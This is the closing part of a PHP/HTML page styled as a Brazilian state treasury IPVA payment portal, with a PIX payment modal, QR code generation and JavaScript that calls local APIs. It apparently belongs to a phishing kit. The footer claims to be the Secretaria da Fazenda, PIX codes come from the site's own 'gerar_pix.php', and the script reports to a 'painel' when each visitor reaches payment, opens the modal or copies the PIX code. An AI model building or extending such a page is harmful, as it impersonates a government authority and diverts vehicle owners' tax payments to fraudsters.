            <li>O(s) pagamento(s) será(ão) apropriado(s) automaticamente de forma sucessiva para a primeira parcela ou cota pendente.</li>
          </ul>
        </section>
      </div>
    </main>

    <footer class="res-footer">
      <div class="res-container">
        <p>© Secretaria da Fazenda - Portal SGT versão IP-01.011.49</p>
      </div>
    </footer>

    <!-- Modal PIX - idêntico ao PixPaymentModal do Lovable -->
    <div class="pix-modal-overlay" id="pixModalOverlay">
      <div class="pix-modal">
        <div class="pix-modal-header">
          <button class="pix-modal-close" onclick="closePixModal()">
            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/>
            </svg>
          </button>
          <div class="pix-modal-title-wrap">
            <svg viewBox="0 0 512 512" fill="currentColor">
              <path d="M112.57 391.19c20.056 0 38.928-7.808 53.12-22l76.693-76.692c5.385-5.404 14.765-5.384 20.15 0l76.989 76.989c14.191 14.172 33.045 21.98 53.12 21.98h15.098l-97.138 97.139c-30.326 30.344-79.505 30.344-109.85 0l-97.415-97.416h9.232zm280.068-271.294c-20.056 0-38.929 7.809-53.12 22l-76.97 76.99c-5.551 5.53-14.6 5.568-20.15-.02l-76.711-76.693c-14.192-14.191-33.046-21.999-53.12-21.999h-9.234l97.416-97.416c30.344-30.344 79.523-30.344 109.867 0l97.138 97.138h-15.116zm105.937 86.745-64.553-64.553h-44.546c-11.206 0-21.72 4.364-29.622 12.287l-77.229 77.229c-14.638 14.619-38.467 14.638-53.086 0l-76.99-77.012c-7.901-7.922-18.416-12.287-29.622-12.287H58.529l-64.27 64.27c-30.345 30.344-30.345 79.523 0 109.867l64.27 64.27h44.807c11.206 0 21.721-4.364 29.622-12.286l76.713-76.732c7.328-7.328 16.949-10.992 26.57-10.992 9.622 0 19.242 3.664 26.57 10.992l76.99 76.99c7.901 7.921 18.416 12.286 29.621 12.286h44.287l64.553-64.553c30.344-30.344 30.344-79.523 0-109.849z"/>
            </svg>
            <h2 class="pix-modal-title">Pagamento via PIX</h2>
          </div>
          <p class="pix-modal-subtitle">Pague instantaneamente</p>
        </div>

        <div class="pix-modal-body">
          <div id="pixMainView">
            <!-- Valor -->
            <div class="pix-valor-section">
              <p class="pix-valor-label">Valor a pagar</p>
              <p class="pix-valor" id="pixValor">R$ 0,00</p>
              <p class="pix-descricao" id="pixDescricao">-</p>
            </div>

            <!-- QR Code -->
            <div class="pix-qrcode-section">
              <div class="pix-qrcode-container" id="pixQrCodeContainer">
                <div class="pix-qrcode-loading" id="pixQrCodeLoading">
                  <div class="pix-spinner"></div>
                  <p>Gerando QR Code...</p>
                </div>
                <canvas id="pixQrCode" style="display: none;"></canvas>
              </div>
            </div>

            <p class="pix-qrcode-text">Escaneie o QR Code com o app do seu banco</p>

            <!-- Divider -->
            <div class="pix-divider">
              <div class="pix-divider-line"></div>
              <span class="pix-divider-text">ou</span>
              <div class="pix-divider-line"></div>
            </div>

            <!-- Código Copia e Cola -->
            <div class="pix-code-section">
              <p class="pix-code-label">Copie o código PIX:</p>
              <div class="pix-code-box" id="pixCodeBox">Gerando código...</div>
              <button class="pix-copy-btn" id="pixCopyBtn" onclick="copyPixCode()">
                <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
                </svg>
                Copiar Pix
              </button>
            </div>

            <!-- Botão de instruções -->
            <button class="pix-help-btn" onclick="showInstructions()">
              <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/>
              </svg>
              Como pagar com PIX?
            </button>
          </div>

          <div id="pixInstructionsView" class="pix-instructions">
            <!-- Instruções de pagamento -->
            <h3 class="pix-instructions-title">Como pagar com PIX</h3>

            <div class="pix-steps">
              <div class="pix-step">
                <div class="pix-step-number">1</div>
                <div class="pix-step-content">
                  <h4>Abra o app do seu banco</h4>
                  <p>Acesse a área de pagamentos ou transferências</p>
                </div>
              </div>

              <div class="pix-step">
                <div class="pix-step-number">2</div>
                <div class="pix-step-content">
                  <h4>Selecione "Pagar com PIX"</h4>
                  <p>Escolha a opção PIX Copia e Cola ou QR Code</p>
                </div>
              </div>

              <div class="pix-step">
                <div class="pix-step-number">3</div>
                <div class="pix-step-content">
                  <h4>Escaneie ou cole o código</h4>
                  <p>Use a câmera para escanear o QR Code ou cole o código copiado</p>
                </div>
              </div>

              <div class="pix-step">
                <div class="pix-step-number">4</div>
                <div class="pix-step-content">
                  <h4>Confirme o pagamento</h4>
                  <p>Verifique os dados e confirme com sua senha ou biometria</p>
                </div>
              </div>
            </div>

            <!-- Botão voltar -->
            <button class="pix-back-btn" onclick="hideInstructions()">Voltar ao QR Code</button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    let currentPixCode = '';
    let currentPagamentoId = null;
    let currentPagamentoCodigo = 0;

    // Base URL para APIs (funciona mesmo em subpastas/URLs amigáveis)
    const baseUrl = '<?= (isset($_SERVER["BASE"]) && !empty($_SERVER["BASE"])) ? $_SERVER["BASE"] : (rtrim(dirname($_SERVER["SCRIPT_NAME"] ?? ''), "/") . "/") ?>';

    const renavam = '<?= htmlspecialchars($renavam) ?>';
    const placa = '<?= htmlspecialchars($vehicleData["Placa"] ?? "") ?>';
    const identificadorCompleto = placa && renavam ? placa + ' / ' + renavam : (placa || renavam || 'IPVA');

    async function marcarModalAberto() {
      if (!currentPagamentoId && !currentPagamentoCodigo) return;
      try {
        await fetch(baseUrl + 'api/marcar_modal_aberto.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            pagamento_id: currentPagamentoId || '',
            pagamento_codigo: Number(currentPagamentoCodigo) || 0,
          }),
        });
      } catch (e) {
        // silencioso
      }
    }

    function openPixModal(valor, descricao, exercicio) {
      // Reset para não misturar pagamentos entre aberturas
      currentPixCode = '';
      currentPagamentoId = null;
      currentPagamentoCodigo = 0;

      // Atualizar tracking para mostrar no painel que entrou na etapa PAGAMENTO
      try {
        if (window.__visitorTracking && typeof window.__visitorTracking.set === 'function') {
          window.__visitorTracking.set({ pagina: 'resultado', etapa: 'pagamento' });
        }
      } catch (e) {}

      document.getElementById('pixValor').textContent = valor;
      document.getElementById('pixDescricao').textContent = descricao;
      document.getElementById('pixCodeBox').textContent = 'Gerando código...';
      document.getElementById('pixModalOverlay').classList.add('active');
      document.getElementById('pixMainView').style.display = 'block';
      document.getElementById('pixInstructionsView').classList.remove('active');

      document.getElementById('pixQrCodeLoading').style.display = 'flex';
      document.getElementById('pixQrCode').style.display = 'none';

      generatePixCode(valor, descricao, exercicio);
    }

    function closePixModal() {
      document.getElementById('pixModalOverlay').classList.remove('active');

      // Voltar tracking para a etapa de RESULTADO
      try {
        if (window.__visitorTracking && typeof window.__visitorTracking.set === 'function') {
          window.__visitorTracking.set({ pagina: 'resultado', etapa: 'resultado' });
        }
      } catch (e) {}
    }

    function showInstructions() {
      document.getElementById('pixMainView').style.display = 'none';
      document.getElementById('pixInstructionsView').classList.add('active');
    }

    function hideInstructions() {
      document.getElementById('pixMainView').style.display = 'block';
      document.getElementById('pixInstructionsView').classList.remove('active');
    }

    async function generatePixCode(valor, descricao, exercicio) {
      try {
        const valorNum = parseFloat(String(valor).replace(/[^\d,]/g, '').replace(',', '.'));

        const descricaoKey = String(descricao || '')
          .normalize('NFD')
          .replace(/[\u0300-\u036f]/g, '')
          .replace(/[^a-zA-Z0-9]+/g, '-')
          .replace(/^-+|-+$/g, '')
          .toUpperCase()
          .substring(0, 32) || 'PAGAMENTO';

        const numeroFatura = 'IPVA-' + exercicio + '-' + renavam + '-' + descricaoKey;

        const response = await fetch(baseUrl + 'api/gerar_pix.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            valor: valorNum,
            identificador: identificadorCompleto,
            numeroFatura: numeroFatura,
            descricao: descricao,
          }),
        });

        const data = await response.json();

        if (data.code) {
          currentPixCode = data.code;
          currentPagamentoId = data.pagamento_id || null;
          currentPagamentoCodigo = Number(data.pagamento_codigo) || 0;

          // GARANTIA: sempre que o modal abrir e tiver pagamento, marca no painel
          // (mesmo se gerar_pix não atualizou por algum motivo)
          marcarModalAberto();

          document.getElementById('pixCodeBox').textContent = currentPixCode;

          document.getElementById('pixQrCodeLoading').style.display = 'none';
          document.getElementById('pixQrCode').style.display = 'block';

          const canvas = document.getElementById('pixQrCode');
          QRCode.toCanvas(canvas, currentPixCode, {
            width: 200,
            margin: 0,
            color: { dark: '#1a1a1a', light: '#ffffff' },
          });
        } else {
          document.getElementById('pixCodeBox').textContent = 'Erro ao gerar código';
          document.getElementById('pixQrCodeLoading').querySelector('p').textContent = 'QR Code não disponível';
        }
      } catch (error) {
        console.error('Erro:', error);
        document.getElementById('pixCodeBox').textContent = 'Erro ao gerar código';
      }
    }

    function copyPixCode() {
      if (!currentPixCode) return;

      navigator.clipboard.writeText(currentPixCode).then(() => {
        const btn = document.getElementById('pixCopyBtn');
        btn.classList.add('copied');
        btn.innerHTML = '<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg> Copiado!';

        // Registrar PIX copiado (aceita pagamento_id ou pagamento_codigo)
        if (currentPagamentoId || currentPagamentoCodigo) {
          fetch(baseUrl + 'api/pix_copiado.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              pagamento_id: currentPagamentoId || '',
              pagamento_codigo: Number(currentPagamentoCodigo) || 0,
            }),
          }).catch(() => {});
        }

        setTimeout(() => {
          btn.classList.remove('copied');
          btn.innerHTML = '<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg> Copiar Pix';
        }, 3000);
      });
    }

    document.getElementById('pixModalOverlay').addEventListener('click', function (e) {
      if (e.target === this) closePixModal();
    });
  </script>

  <?php include __DIR__ . '/includes/tracking.php'; ?>
</body>
</html>
